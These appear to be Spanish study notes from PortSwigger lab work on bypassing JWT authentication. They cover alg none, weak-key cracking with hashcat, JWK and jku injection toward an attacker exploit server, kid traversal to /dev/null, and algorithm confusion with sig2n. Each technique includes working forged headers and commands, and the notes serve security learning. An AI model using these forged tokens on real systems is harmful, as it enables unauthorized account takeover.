
---
Tags: #JWT #JSONWebToken #Autenticación #Tokens #Criptografía #BypassFirma #AlgorithmConfusion #NoneAlgorithm #JWKInjection #JKUInjection #KidTraversal #AtaqueSimétrico #AtaqueAsimétrico #BurpSuite #JWTEditor #Hashcat #Sig2N

---
# Índice de Contenidos

- [[#1. Conceptos Base y Herramientas]]
    [[#Tabla Resumen Cabeceras comunes en JWT]]
    [[#Herramientas Clave]]
	
- [[#2. Bypass de autenticación JWT sin verificar la firma]]
    
- [[#3. Bypass de autenticación JWT por verificación defectuosa Algoritmo none]]
    
- [[#4. Bypass de autenticación JWT con clave débil]]
    
- [[#5. Bypass de autenticación JWT por inyección en JWK]]
    
- [[#6. Bypass de autenticación JWT por inyección en jku]]
    
- [[#7. Bypass de autenticación JWT con traversal en kid]]
    
- [[#8. Bypass de autenticación JWT por confusión de algoritmo]]
    
- [[#9. Confusión de algoritmo JWT sin clave expuesta (sig2n)]]
	
- [[#<span style="color 2D882D;">10. Tablas Resumen y Cheatsheets</span>||10. Tablas Resumen y Cheatsheets]]
	- [[#<span style="color 28578E;">Clasificación de Algoritmos Comunes</span>||Clasificación de Algoritmos Comunes]]
	- [[#<span style="color 28578E;">Matriz de Técnicas Ofensivas JWT</span>||Matriz de Técnicas Ofensivas JWT]]
	
---

## 1. Conceptos Base y Herramientas

Antes de entrar en las técnicas de ataque, es vital entender qué estamos manipulando. Un JSON Web Token (JWT) es un estándar abierto que define una forma compacta y autónoma de transmitir información de forma segura entre las partes como un objeto JSON.

### Tabla Resumen: Cabeceras comunes en JWT

|**Parámetro**|**Descripción**|**Implicación de Seguridad**|
|---|---|---|
|**alg**|Algoritmo usado para la firma (ej. RS256, HS256, none).|Si el servidor confía ciegamente, permite ataques de confusión o _none_.|
|**kid**|_Key ID_. Identificador de la clave usada para firmar.|Puede ser vulnerable a _Directory Traversal_ o inyecciones SQL.|
|**jwk**|_JSON Web Key_. Representación JSON de la clave criptográfica.|Si el servidor confía en un JWK inyectado, el atacante controla la firma.|
|**jku**|_JWK Set URL_. URL que apunta a un conjunto de claves.|Vulnerable a _SSRF_ o control de firma si apunta a un servidor malicioso.|

### Herramientas Clave

- **Burp Suite (Inspector / Repeater):** Esencial para interceptar, decodificar en tiempo real (Base64Url) y modificar las peticiones HTTP y las cookies de sesión.
    
- **Extensión JWT Editor (Burp Suite):** Un plugin fundamental. Permite generar claves criptográficas (RSA, Simétricas), inyectar parámetros directamente en la cabecera del token, modificar el _payload_ y refirmar automáticamente el JWT con las claves que hayamos manipulado.
    
- **Hashcat:** Herramienta de recuperación de contraseñas de alta velocidad. La utilizamos aquí para realizar ataques de fuerza bruta (offline) contra firmas JWT cuando sospechamos que se ha utilizado una clave secreta débil.
    

---

## 2. Bypass de autenticación JWT sin verificar la firma

**Definición:** Esta es la vulnerabilidad más básica. Ocurre cuando la aplicación backend decodifica el token para extraer la información (como el usuario) pero **falla al verificar matemáticamente la firma** contra su clave secreta o pública. El servidor confía ciegamente en el _Payload_.

**Cómo descubrirla y explotarla:**

El proceso es directo. Decodificas el JWT, cambias el usuario en el _Payload_ por el de la víctima, vuelves a codificar en Base64Url y envías la petición. Si el servidor lo acepta sin validar la porción final del token, eres vulnerable.

**Prueba de Concepto (PoC):**

Encontramos la siguiente cookie de sesión:

```HTTP
Cookie: session=eyJraW...[Header]....eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc3MTg0Nzk0MSwic3ViIjoid2llbmVyIn0.[Firma]
```

Decodificando el _Payload_ con el inspector de Burp, vemos:

```JSON
{"iss":"portswigger","exp":1771847941,"sub":"wiener"}
```

Simplemente alteramos el valor de `sub` (subject/usuario) a nuestro objetivo:

```JSON
{"iss":"portswigger","exp":1771847941,"sub":"administrator"}
```

Al inyectar este nuevo _Payload_ en la cookie (manteniendo la cabecera y la firma original intactas o incluso borrando la firma), logramos escalar privilegios.

---

## 3. Bypass de autenticación JWT por verificación defectuosa Algoritmo none

**Definición:**

El estándar JWT admite un algoritmo llamado `none`. Está diseñado para situaciones donde la integridad del token ya está garantizada por otros medios. Si las librerías de validación del servidor no están configuradas para rechazar este algoritmo, un atacante puede indicar explícitamente `alg: none`, eliminando la necesidad de una firma válida.

**Cómo descubrirla y explotarla:**

Se modifica la cabecera del token para establecer `"alg":"none"`. Se modifica el _Payload_ con los datos deseados y **se elimina la firma** del token (dejando el punto final).

**Prueba de Concepto (PoC):**

Modificamos el Header original:

```JSON
{"kid":"a29155fd-8ae7-49de-a7b6-2e00a1184d7b","alg":"RS256"}
```

Por este nuevo Header:

```JSON
{"kid":"a29155fd-8ae7-49de-a7b6-2e00a1184d7b","alg":"none"}
```

Modificamos el Payload al usuario `administrator` y construimos el JWT asegurándonos de que termina en punto `.`, indicando que la sección de la firma está vacía:

```HTTP
eyJraW...[Header Modificado]...%3d.eyJpc3Mi...[Payload Modificado]...J9.
```

---

## 4. Bypass de autenticación JWT con clave débil

**Definición:**

Los algoritmos simétricos como **HS256** utilizan una única clave secreta tanto para firmar como para verificar. Si los desarrolladores utilizan una clave débil o predecible (como "secret", "123456", "password"), un atacante que intercepte un solo token válido puede realizar un ataque de fuerza bruta offline para descubrir dicha clave.

**Cómo descubrirla y explotarla:**

1. Guardar un token válido en un archivo de texto.
    
2. Usar un diccionario de claves comunes y una herramienta como Hashcat.
    
3. Una vez obtenida la clave, usar JWT Editor para firmar nuevos tokens maliciosos.
    

**Prueba de Concepto (PoC):**

Lanzamos Hashcat contra nuestro token guardado (`jwt.txt`):

```Bash
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/jwt-secrets/jwt.secrets.list
```

_Nota: `-m 16500` especifica el formato JWT, aunque versiones modernas de hashcat lo autodetectan._

Al crackearla, descubrimos que la clave es `secret1`.

En la extensión JWT Editor de Burp, creamos una nueva clave simétrica. Convertimos `secret1` a Base64 (`c2VjcmV0MQ==`) y lo introducimos en el parámetro `k`:

```JSON
{
    "kty": "oct",
    "kid": "e3a8e0e6-ded1-467a-987b-9d1abb67d754",
    "k": "c2VjcmV0MQ=="
}
```

Con esta clave guardada en la extensión, vamos al Repeater, modificamos el usuario a `administrator` en la pestaña _JSON Web Token_, y hacemos clic en **Sign** seleccionando nuestra clave descubierta.

---

## 5. Bypass de autenticación JWT por inyección en JWK

**Definición:**

El parámetro `jwk` (JSON Web Key) dentro de la cabecera permite al servidor incrustar la clave pública que debe usarse para verificar el token. Si el servidor confía ciegamente en este parámetro suministrado por el usuario, sin validar si esa clave pertenece a una lista de claves confiables del sistema, estamos ante una vulnerabilidad crítica.

**Cómo descubrirla y explotarla:**

Consiste en generar tu propio par de claves RSA. Pones la clave pública generada dentro del parámetro `jwk` en la cabecera del token y firmas el token con tu clave privada correspondiente.

**Prueba de Concepto (PoC):**

1. Identificamos que se usa `RS256` (Asimétrico).
    
2. En JWT Editor, creamos y generamos una nueva **RSA Key**.
    
3. En el Repeater, dentro de la pestaña _JSON Web Token_, cambiamos el usuario a `administrator`.
    
4. Hacemos clic en **Attack** y seleccionamos **Embedded JWK**, eligiendo la clave RSA que acabamos de generar.
    
5. La extensión automáticamente incrusta la clave pública en el Header bajo el parámetro `jwk` y firma el token con la clave privada, logrando evadir la autenticación.

---

## <span style="color:#2D882D;">6. Bypass de autenticación JWT por inyección en jku</span>

**Definición:** El parámetro de cabecera `jku` (JWK Set URL) proporciona una URL desde la cual el servidor puede descargar un conjunto de claves (JWK Set) para verificar la firma del token. Si el backend no valida (o lista blanca) correctamente las URLs permitidas, estamos ante una vulnerabilidad similar a un SSRF (_Server-Side Request Forgery_), que nos permite obligar al servidor a usar nuestra propia clave pública.

**Cómo descubrirla y explotarla:**

1. Generamos un par de claves RSA bajo nuestro control.
    
2. Alojamos la clave pública (formato JWK) en un servidor web malicioso que controlemos.
    
3. Modificamos la cabecera del JWT añadiendo el parámetro `jku` apuntando a nuestro servidor.
    
4. Firmamos el token con nuestra clave privada. El servidor víctima descargará nuestra clave pública, verificará la firma (que será válida) y nos dará acceso.
    

**Prueba de Concepto (PoC):** Primero, vemos que se usa `RS256`. Generamos una clave RSA con el plugin _JWT Editor_. Hacemos clic derecho en la clave creada y seleccionamos "Copy public key as JWK". Alojamos este JSON en nuestro servidor exploit:

```JSON
{
    "keys": [
        {
            "kty": "RSA",
            "e": "AQAB",
            "kid": "a7735fe6-afe2-49fe-919d-014260fd082a",
            "n": "r4np9eGHKBNJKqWDDBhPkA2Dboi_E5furnTwERo96itzkyLcfSqp-Nd50-2qFIb6j2tDlraZ7sBmUsZOiX4TbVyjFV4PqJzQcfUKa5WfAkyvqwL4n7XsWfw7jRrK8vu30dgLpm0MIaXRRRluyPheOpTaR8Xkhc4LsoH03f6KuzfOkZeqb8nUjRGUEsE4ETlqGplgzCYLYWWsTFfgQauByKgxYwKVbBn7XDQy0DuKg0GWfizeof6ddmtOdQnGVItR3zIdf4Pw3TE5mXRgqtywsrpAFVxreatANic7dnbXkvPgfp9kXAHOw2fKtihPlinzYjSRzrJGNLjmg-qltaeUiQ"
        }
    ]
}
```

En la cabecera del token JWT inyectamos el parámetro `jku` con la URL de nuestro servidor malicioso, y nos aseguramos de que el `kid` coincida con el de nuestro archivo JSON:

```JSON
{
    "kid": "a7735fe6-afe2-49fe-919d-014260fd082a",
    "alg": "RS256",
    "jku": "https://exploit-0a4600670311fbca8453e42001330069.exploit-server.net/exploit"
}
```

Cambiamos el usuario en el _Payload_ a la víctima, firmamos con nuestra clave privada en Burp y enviamos.

---

## <span style="color:#2D882D;">7. Bypass de autenticación JWT con traversal en kid</span>

**Definición:** El parámetro `kid` (Key ID) indica qué clave se usó para firmar. A veces, el backend utiliza el valor de `kid` para buscar el archivo de la clave directamente en el sistema de archivos local del servidor. Si no sanitiza este input, podemos usar _Directory Traversal_ (`../`) para apuntar a un archivo con contenido predecible, como `/dev/null` en sistemas Linux (el cual está vacío).

**Cómo descubrirla y explotarla:** Cambiamos el valor de `kid` por una ruta hacia `/dev/null`. Como `/dev/null` devuelve un byte nulo o vacío, podemos firmar nuestro JWT utilizando un algoritmo simétrico (como HS256) empleando un byte nulo como clave secreta.

**Prueba de Concepto (PoC):** Obtenemos el valor en Base64 de un byte nulo:

```Bash
echo -ne '\0' | base64
# Devuelve: AA==
```

En _JWT Editor_, generamos una nueva clave Simétrica (para HS256). Reemplazamos el valor del parámetro `k` por el byte nulo en Base64 (`AA==`) y guardamos. En el Repeater, modificamos el Header del token:

```JSON
{
    "kid": "../../../../../../dev/null",
    "alg": "HS256"
}
```

Cambiamos el usuario en el _Payload_, firmamos el token usando nuestra clave nula y reemplazamos la cookie de sesión. El servidor leerá `/dev/null`, obtendrá un valor nulo como clave secreta, la comparará con nuestra firma (hecha con una clave nula) y el token será válido.

---

## <span style="color:#2D882D;">8. Bypass de autenticación JWT por confusión de algoritmo</span>

**Definición:** Ocurre cuando el servidor espera un token firmado con un algoritmo asimétrico (ej. RS256, que requiere clave privada para firmar y pública para verificar) pero **no verifica que el algoritmo recibido sea el esperado**. Si el servidor expone su clave pública, el atacante puede descargarla, cambiar la cabecera del token a un algoritmo simétrico (`HS256`) y firmar el token usando **la clave pública como si fuera la clave secreta simétrica**. El backend, confundido, verificará el token simétricamente usando su propia clave pública, dándolo por válido.

**Cómo descubrirla y explotarla:** Buscamos endpoints comunes donde se exponga la clave pública del servidor. Si lo encontramos, transformamos esa clave pública a un formato adecuado, cambiamos el header a `HS256` y firmamos.

**Endpoints comunes de claves expuestas:**

Plaintext

```
/.well-known/jwks.json
/jwks.json
/.well-known/openid-configuration
```

**Prueba de Concepto (PoC):** Al visitar `/jwks.json` encontramos la clave pública `RSA`. En _JWT Editor_:

1. Creamos una clave `RSA` copiando los parámetros (`e`, `n`, `kid`, etc.) del endpoint.
    
2. Hacemos clic derecho y seleccionamos "Copy public key as PEM".
    
3. Convertimos ese bloque PEM completo a Base64.
    
4. Creamos una **nueva clave simétrica** y pegamos el PEM en Base64 en el parámetro `k`. Modificamos el Header y Payload del JWT:
    

```JSON
{
    "kid": "24d28404-ee7f-49a0-bc38-abf0895acede",
    "alg": "HS256"
}
```

Firmamos en la pestaña _JSON Web Token_ usando la clave simétrica que acabamos de crear a partir del PEM y logramos el bypass.

---

## <span style="color:#2D882D;">9. Confusión de algoritmo JWT sin clave expuesta (sig2n)</span>

**Definición:** Esta es la misma vulnerabilidad de Confusión de Algoritmo, pero en un escenario _Blind_ (Ciego). El servidor **no expone** la clave pública. Sin embargo, matemáticamente es posible deducir la clave pública analizando dos o más firmas RSA válidas emitidas por el servidor.

**Uso de la Herramienta (sig2n):** `sig2n` es un script (a menudo usado vía Docker) que toma múltiples tokens firmados por el servidor. Al comparar las firmas, puede derivar un conjunto reducido de posibles claves públicas. Una de ellas será la correcta.

**Cómo descubrirla y explotarla:**

1. Iniciamos sesión dos veces para generar dos tokens JWT diferentes generados por el servidor.
    
2. Alimentamos la herramienta matemática para deducir la clave pública.
    
3. Repetimos el ataque de confusión de algoritmo con la clave obtenida.
    

**Prueba de Concepto (PoC):** Ejecutamos la extracción matemática usando Docker:

```Bash
sudo docker run --rm -it portswigger/sig2n <token1> <token2>
```

La herramienta escupirá posibles claves públicas (y tokens manipulados de prueba). Probamos los tokens devueltos hasta que el servidor nos dé un `200 OK`. Una vez validada la clave correcta, vamos a _JWT Editor_, creamos una nueva clave **Simétrica** para `HS256`, e insertamos en el parámetro `k` la clave pública codificada en Base64 que nos dio la herramienta. Firmamos nuestro _Payload_ malicioso y listo.

---

## <span style="color:#2D882D;">10. Tablas Resumen y Cheatsheets</span>

Para completar tus apuntes de Obsidian y tener todo a mano de un vistazo, he creado estas tablas resumen para ti.

### <span style="color:#28578E;">Clasificación de Algoritmos Comunes</span>

|Familia Algoritmo|Tipo|Descripción|Vulnerabilidad común si se configura mal|
|---|---|---|---|
|**HS256, HS384, HS512**|Simétrico|Usa una misma clave secreta compartida para firmar y verificar.|Claves débiles crackeables (Fuerza bruta con Hashcat).|
|**RS256, RS384, RS512**|Asimétrico (RSA)|Usa clave privada para firmar y pública para verificar.|Confusión de Algoritmos (si el servidor acepta cambiarlos a HS).|
|**ES256, ES384, ES512**|Asimétrico (ECDSA)|Basado en curvas elípticas. Más rápidos y cortos que RSA.|Fallos en implementación matemática, inyección de claves.|
|**none**|Ninguno|No requiere firma.|Bypass directo de autenticación si el servidor no lo bloquea.|

### <span style="color:#28578E;">Matriz de Técnicas Ofensivas JWT</span>

|Técnica de Ataque|Vector Principal|¿Qué manipular?|Herramienta recomendada|
|---|---|---|---|
|**Bypass de Firma nula**|Falta de validación final|Borrar firma, modificar Payload.|Burp Suite Repeater|
|**Algoritmo 'none'**|Mala configuración librerías|Cambiar `alg` a `none`, borrar firma.|Burp Suite Repeater|
|**Fuerza Bruta Claves**|Clave simétrica débil|Extraer token válido.|Hashcat / SecLists|
|**Inyección JWK**|Servidor confía en input|Añadir clave pública propia en cabecera `jwk`.|JWT Editor (Burp)|
|**Inyección JKU**|SSRF en cabecera|Cabecera `jku` apuntando a servidor del atacante.|JWT Editor + Exploit Server|
|**Directory Traversal KID**|Lectura local de clave|Cabecera `kid` apuntando a `../../dev/null`.|JWT Editor (k=null byte)|
|**Confusión de Algoritmo**|Fallo validación de algoritmo|Cambiar `alg` de RS a HS y firmar con clave pública.|JWT Editor|
|**Confusión Ciega (sig2n)**|Fallo validación + Criptografía|Derivar clave pública y hacer confusión de alg.|sig2n (Docker) + JWT Editor|